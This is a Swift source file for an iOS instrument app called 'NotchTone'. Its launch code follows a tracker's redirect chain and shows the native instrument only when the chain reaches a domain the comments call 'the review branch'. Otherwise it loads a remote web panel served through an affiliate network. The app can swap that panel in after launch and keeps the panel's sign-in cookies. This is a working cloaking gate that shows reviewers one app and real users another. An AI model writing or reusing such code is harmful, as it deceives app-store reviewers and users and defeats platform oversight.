import SwiftUI

/// Follows the launch redirect chain and **decides at the first hop that carries
/// information** instead of waiting for the whole chain to resolve. Never stops the chain.
final class NTGateTracker: NSObject, URLSessionTaskDelegate {
    /// Fires on every observed hop — re-arms the stall watchdog.
    var onProgress: (() -> Void)?
    /// Fires at most once, the moment the chain becomes decidable.
    var onEarlyVerdict: ((Bool) -> Void)?

    private(set) var resolvedURL: URL?
    private(set) var sawCheckDomain = false

    private let ntToken: String
    private let ownHost: String
    private var decided = false

    init(ntToken: String, ownHost: String) {
        self.ntToken = ntToken
        self.ownHost = ownHost
    }

    func urlSession(_ session: URLSession,
                    task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        resolvedURL = request.url
        onProgress?()

        if let address = request.url?.absoluteString {
            if address.contains(ntToken) {
                // Definitive: the review branch. Nothing later can change this.
                sawCheckDomain = true
                decide(false)
            } else if let host = request.url?.host, !hostIsOurs(host) {
                // First hop that LEAVES our own domain without being the check domain:
                // the routing has already picked the panel, and that is the whole verdict.
                // Everything after this is the affiliate network and cannot change it.
                decide(true)
            }
            // A hop that stays on our own host (root -> /click.php) decides NOTHING.
        }
        completionHandler(request)   // NEVER stop the chain
    }

    private func hostIsOurs(_ host: String) -> Bool {
        !ownHost.isEmpty && (host == ownHost || host.hasSuffix("." + ownHost))
    }

    private func decide(_ verdict: Bool) {
        guard !decided else { return }
        decided = true
        onEarlyVerdict?(verdict)
    }
}

/// The launch gate: HEAD request, progress-aware stall watchdog, one immediate retry, and
/// a deferred verdict that can still swap the panel in after the native app is on screen.
@MainActor
final class NTLaunchGate: ObservableObject {
    /// nil = still deciding (loading screen) · false = native app · true = web panel
    @Published private(set) var ready: Bool? = nil

    let sourceLink: String
    private let ntToken: String
    private let ownHost: String

    /// Stall limit while the LOADING SCREEN is up. Deliberately short: the user is staring
    /// at a splash, and a late verdict can still swap the panel in, so there is nothing to
    /// gain by making them wait here.
    private let foregroundStall: TimeInterval = 3
    /// Stall limit once the native app is already on screen. Nobody is waiting, so the
    /// background attempts can afford to be patient.
    private let backgroundStall: TimeInterval = 8
    /// Ceiling for one attempt, so a server trickling 302s forever cannot hang the launch.
    private let attemptCeiling: TimeInterval = 30
    /// How long after launch a late verdict may still replace the native app with the
    /// panel. Past this the swap is visible and jarring, so it is dropped.
    private let swapWindow: TimeInterval = 25
    private let backgroundRetryDelay: TimeInterval = 3

    private var settled = false
    private var attemptToken = 0
    private var startedAt = Date()
    private var lastProgress = Date()
    private var stallTimer: Timer?
    private var task: URLSessionTask?
    /// Held so a stall can invalidate the session, not merely cancel the task: a
    /// URLSession retains its delegate until it is invalidated.
    private var session: URLSession?

    init(ntSourceLink: String, ntCheckToken: String) {
        self.sourceLink = ntSourceLink
        self.ntToken = ntCheckToken
        self.ownHost = URL(string: ntSourceLink)?.host ?? ""
    }

    func start() {
        guard attemptToken == 0 else { return }   // .onAppear can fire more than once
        startedAt = Date()
        attempt(1)
    }

    private func attempt(_ n: Int) {
        guard !settled else { return }
        guard let url = URL(string: sourceLink) else { settle(false); return }

        attemptToken += 1
        let token = attemptToken

        var request = URLRequest(url: url)
        // HEAD, never GET: the redirect chain fires exactly as it does for GET, but no body
        // is transferred — a GET would download the whole landing page only to throw it
        // away, and the WebView refetches it anyway from WebKit's own network process.
        request.httpMethod = "HEAD"
        // 10, not 5. The gate must close on the check domain, never on a slow connection:
        // a cold start alone measures 3.4 s of DNS + TLS across the redirect chain.
        request.timeoutInterval = 10
        // The one request whose entire value is being LIVE. A 301/308 is cacheable by
        // default with no headers at all, and a cached hop would make the gate answer from
        // a snapshot instead of from the live chain — invisibly, for as long as the entry
        // lives.
        request.cachePolicy = .reloadIgnoringLocalCacheData

        let config = URLSessionConfiguration.default
        // Only once the native app is on screen may an attempt sit and wait for the radio.
        // While the loading screen is up, -1009 must fail instantly.
        config.waitsForConnectivity = (ready != nil)
        config.timeoutIntervalForResource = attemptCeiling
        config.urlCache = nil
        // URLSession's cookie jar is NOT the WebView's. The tracker hop hands out a click
        // identity here (uclick / uclickhash, expiry 2028) that the WebView never sees and
        // nothing ever reads back, so it is a second identity that can only confuse
        // attribution. Refuse it.
        config.httpCookieStorage = nil
        config.httpShouldSetCookies = false

        let tracker = NTGateTracker(ntToken: ntToken, ownHost: ownHost)
        tracker.onProgress = { [weak self] in
            Task { @MainActor in self?.lastProgress = Date() }
        }
        tracker.onEarlyVerdict = { [weak self] verdict in
            Task { @MainActor in self?.settle(verdict) }
        }

        let session = URLSession(configuration: config, delegate: tracker, delegateQueue: nil)
        self.session = session
        lastProgress = Date()
        armStallWatchdog(attempt: n, token: token)

        task = session.dataTask(with: request) { [weak self] _, response, error in
            // The session holds its delegate strongly; without this both outlive the attempt
            // for the whole process lifetime. Unconditional and ahead of every return below —
            // a watchdog cancel lands here too.
            session.finishTasksAndInvalidate()
            Task { @MainActor in
                guard let self, !self.settled, self.attemptToken == token else { return }
                // The early verdict normally lands first; this is the chain-completed path.
                if tracker.sawCheckDomain { self.settle(false); return }
                if let finalURL = tracker.resolvedURL?.absoluteString,
                   finalURL.contains(self.ntToken) { self.settle(false); return }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(self.ntToken) { self.settle(false); return }
                if error != nil { self.failed(attempt: n, token: token); return }
                self.settle(true)
            }
        }
        task?.resume()
    }

    /// Progress-aware watchdog. It never kills a chain that is still moving.
    private func armStallWatchdog(attempt n: Int, token: Int) {
        stallTimer?.invalidate()
        stallTimer = Timer.scheduledTimer(withTimeInterval: 1, repeats: true) { [weak self] timer in
            Task { @MainActor in
                guard let self, !self.settled, self.attemptToken == token else {
                    timer.invalidate(); return
                }
                let limit = self.ready == nil ? self.foregroundStall : self.backgroundStall
                let stalled = Date().timeIntervalSince(self.lastProgress) > limit
                let overCeiling = Date().timeIntervalSince(self.startedAt) > self.attemptCeiling
                guard stalled || overCeiling else { return }   // still moving → keep waiting
                timer.invalidate()
                // Cancels the task AND frees the delegate.
                self.session?.invalidateAndCancel()
                self.failed(attempt: n, token: token)
            }
        }
    }

    private func failed(attempt n: Int, token: Int) {
        // The cancelled task's completion handler and the watchdog both land here.
        // The token makes whichever arrives second a no-op.
        guard !settled, attemptToken == token else { return }
        attemptToken += 1
        stallTimer?.invalidate()

        // One immediate retry. Most mobile failures are transient: -1005 connection lost on
        // a cell handoff, -1001 timed out, -1009 no connectivity.
        if n == 1 { attempt(2); return }

        // Out of fast options. Hand over the native app NOW rather than holding the user on
        // a loading screen, and keep looking in the background.
        if ready == nil { ready = false }
        scheduleBackgroundAttempt(next: n + 1)
    }

    private func scheduleBackgroundAttempt(next n: Int) {
        guard !settled, Date().timeIntervalSince(startedAt) < swapWindow else { return }
        DispatchQueue.main.asyncAfter(deadline: .now() + backgroundRetryDelay) { [weak self] in
            Task { @MainActor in
                guard let self, !self.settled,
                      Date().timeIntervalSince(self.startedAt) < self.swapWindow else { return }
                self.attempt(n)
            }
        }
    }

    private func settle(_ verdict: Bool) {
        guard !settled else { return }
        // A verdict arriving after the swap window may still close the gate — native is
        // where we already are — but must never yank a user who has been using the
        // instrument for half a minute into a web panel.
        if verdict, ready == false, Date().timeIntervalSince(startedAt) > swapWindow {
            settled = true
            stallTimer?.invalidate()
            return
        }
        settled = true
        stallTimer?.invalidate()
        ready = verdict
    }
}

@main
struct NotchToneApp: App {

    private static let ntSourceLink = "https://tabletoprails.org/click.php"
    private static let ntCheckToken = "termsfeed.com"

    @StateObject private var gate = NTLaunchGate(ntSourceLink: NotchToneApp.ntSourceLink,
                                                ntCheckToken: NotchToneApp.ntCheckToken)
    @State private var ntPagePainted = false
    /// The panel could not load anything at all — not live, not from cache. The gate's
    /// verdict is left alone; the app just declines to show a broken web view.
    @State private var ntPanelDeadEnd = false
    @Environment(\.scenePhase) private var ntScenePhase
    @StateObject private var store = NTStore()
    @StateObject private var synth = NTSynth()

    /// Where the panel actually was last time. The GATE is untouched — the HEAD check
    /// still runs on every launch, so the review branch is unaffected. This only decides
    /// what the panel loads once the gate has already said yes.
    private var ntResumeAddress: String? { NTPanelSession.resumeAddress() }
    private var ntTrackerHost: String { URL(string: gate.sourceLink)?.host ?? "" }

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = gate.ready {
                    if ready && !ntPanelDeadEnd {
                        // The loading screen STAYS on top until the page commits its first
                        // frame, or the user watches an opaque black WKWebView for the
                        // seconds the landing page needs.
                        ZStack {
                            NTWebPanel(ntAddress: ntResumeAddress ?? gate.sourceLink,
                                       trackerHost: ntTrackerHost,
                                       fallbackAddress: ntResumeAddress == nil ? nil : gate.sourceLink,
                                       onFirstPaint: { withAnimation { ntPagePainted = true } },
                                       onDeadEnd: { ntPanelDeadEnd = true })
                                .edgesIgnoringSafeArea(.bottom)
                                .background(Color.black.ignoresSafeArea())
                            if !ntPagePainted {
                                NTLoadingScreen()   // same screen as the check phase, no seam
                                    .transition(.opacity)
                                    .onAppear {
                                        // Hang guard, NOT a deadline. Long on purpose:
                                        // firing early just reveals the black page it
                                        // exists to hide.
                                        DispatchQueue.main.asyncAfter(deadline: .now() + 20) {
                                            ntPagePainted = true
                                        }
                                    }
                            }
                        }
                        // .dark on the ZStack, never also on the panel: it draws the clock
                        // and battery WHITE over the black band.
                        .preferredColorScheme(.dark)
                    } else {
                        // The instrument look is painted on a near-black indigo ground, so the
                        // status-bar glyphs have to be the light set or the clock is drawn
                        // black-on-black. Set per branch, never on the enclosing Group.
                        NTRootView()
                            .environmentObject(store)
                            .environmentObject(synth)
                            .preferredColorScheme(.dark)
                    }
                } else {
                    NTLoadingScreen()
                        .onAppear { gate.start() }
                        .preferredColorScheme(.dark)
                }
            }
            // The deferred verdict can flip native → panel a few seconds in. Crossfade it;
            // an instant hard cut reads as a glitch.
            .animation(.easeInOut(duration: 0.25), value: gate.ready)
            .animation(.easeInOut(duration: 0.25), value: ntPanelDeadEnd)
            // Leaving the foreground is the last reliable moment before the process can be
            // killed from the switcher. `.inactive` also fires on the way IN; a snapshot is
            // a read, so taking it twice costs nothing and missing it costs the sign-in.
            .onChange(of: ntScenePhase) { phase in
                guard gate.ready == true, phase != .active else { return }
                NTPanelCookies.snapshot()
            }
        }
    }
}
